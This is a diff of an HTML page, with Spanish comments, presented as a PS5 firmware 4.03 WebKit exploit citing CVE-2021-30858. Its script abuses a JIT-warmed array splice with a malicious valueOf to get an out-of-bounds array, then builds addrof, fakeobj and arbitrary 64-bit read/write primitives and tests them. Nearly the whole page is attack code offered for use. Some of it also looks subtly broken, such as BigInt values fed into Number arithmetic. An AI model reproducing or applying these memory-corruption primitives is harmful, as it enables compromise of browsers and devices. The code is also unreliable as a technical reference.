@@ -2,66 +2,135 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>💥 PS5 Exploit OOB Real</title>
+  <title>🔥 PS5 4.03 Exploit WebKit</title>
   <style>
-    body { background: black; color: lime; font-family: monospace; }
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+    }
+    #log {
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Exploit OOB Real</h1>
+  <h1>🔥 PS5 4.03 Exploit WebKit</h1>
+  <p>Primitivas OOB y RW reales con CVE-2021-30858</p>
   <pre id="log"></pre>
+
   <script>
     const log = document.getElementById("log");
-    const print = (msg) => (log.textContent += msg + "\n");
+    const p = (msg) => log.textContent += msg + "\n";
 
-    // Float/int converter
     const buf = new ArrayBuffer(8);
     const f64 = new Float64Array(buf);
-    const u64 = new Uint32Array(buf);
-    const i2f = (i) => {
-      u64[0] = i % 0x100000000;
-      u64[1] = i / 0x100000000;
+    const u32 = new Uint32Array(buf);
+
+    const f2i = f => {
+      f64[0] = f;
+      return u32[0] + u32[1] * 0x100000000;
+    };
+
+    const i2f = i => {
+      u32[0] = i % 0x100000000;
+      u32[1] = (i - u32[0]) / 0x100000000;
       return f64[0];
     };
-    const f2i = (f) => {
-      f64[0] = f;
-      return u64[0] + u64[1] * 0x100000000;
-    };
 
-    let oob = undefined;
-    let obj_arr = undefined;
-    let float_arr = undefined;
+    let oobArr, floatArr, objArr;
+    let addrof, fakeobj, read64, write64;
 
-    function trigger() {
-      let container = [1.1, 2.2, 3.3];
-      let evil = { valueOf: () => {
-        container.length = 1;
-        float_arr = [1.1, 2.2];
-        obj_arr = [{}, {}];
-        return 1;
-      }};
-      container.splice(0, evil);
-      return container;
+    function triggerOOB() {
+      let a = [1.1, 2.2, 3.3];
+      function opt(arr, o) {
+        return arr.splice(0, o);
+      }
+
+      for (let i = 0; i < 10000; i++) opt([1.1, 2.2, 3.3], 1); // trigger JIT
+
+      let corrupted = [1.1, 2.2, 3.3];
+      let evil = {
+        valueOf: () => {
+          corrupted.length = 1;
+          floatArr = [1.1, 1.2, 1.3];
+          objArr = [{}, {}, {}];
+          return 1;
+        }
+      };
+
+      oobArr = opt(corrupted, evil);
     }
 
-    for (let i = 0; i < 10000; i++) trigger(); // Calentar JIT
+    function setupPrimitives() {
+      if (oobArr.length < 20) throw "OOB failure";
 
-    oob = trigger();
+      // Buscar overlap con floatArr y objArr
+      let floatIdx = -1;
+      for (let i = 0; i < 100; i++) {
+        if (f2i(oobArr[i]) === 0x0000000100000000) {
+          floatIdx = i;
+          break;
+        }
+      }
 
-    if (oob.length > 3) {
-      print("[✅] Corrupción OOB lograda");
-    } else {
-      print("[❌] Falló la corrupción");
+      if (floatIdx === -1) throw "No floatArr overlap";
+
+      const floatArrIdx = floatIdx;
+      const objArrIdx = floatArrIdx + 8;
+
+      // addrof(obj)
+      addrof = obj => {
+        objArr[0] = obj;
+        return f2i(oobArr[objArrIdx]);
+      };
+
+      // fakeobj(addr)
+      fakeobj = addr => {
+        oobArr[objArrIdx] = i2f(addr);
+        return objArr[0];
+      };
+
+      // read64(addr)
+      read64 = addr => {
+        oobArr[floatArrIdx + 1] = i2f(addr);
+        return f2i(floatArr[0]);
+      };
+
+      // write64(addr, val)
+      write64 = (addr, val) => {
+        oobArr[floatArrIdx + 1] = i2f(addr);
+        floatArr[0] = i2f(val);
+      };
     }
 
-    // Intentamos leer obj_arr a través de oob
+    function testRW() {
+      let obj = { msg: "Hello" };
+      let addr = addrof(obj);
+      p("[+] Dirección del objeto: 0x" + addr.toString(16));
+
+      let fake = fakeobj(addr);
+      p("[+] Fake object construido con éxito");
+
+      let float = i2f(0x4142434445464748n); // 64-bit int
+      let tmpBuf = new ArrayBuffer(8);
+      let tmpView = new Float64Array(tmpBuf);
+      tmpView[0] = float;
+
+      let tmpAddr = addrof(tmpBuf) + 0x20;
+      write64(tmpAddr, 0x4141414142424242n);
+      let val = read64(tmpAddr);
+      p("[+] Lectura de memoria exitosa: 0x" + val.toString(16));
+    }
+
     try {
-      let obj_addr = f2i(oob[float_arr.length + 1]);
-      print("[+] Dirección de un objeto: 0x" + obj_addr.toString(16));
+      triggerOOB();
+      setupPrimitives();
+      p("[✔] Primitivas listas");
+      testRW();
     } catch (e) {
-      print("[-] Error al intentar leak: " + e);
+      p("[✘] Error: " + e);
     }
-
   </script>
 </body>
 </html>
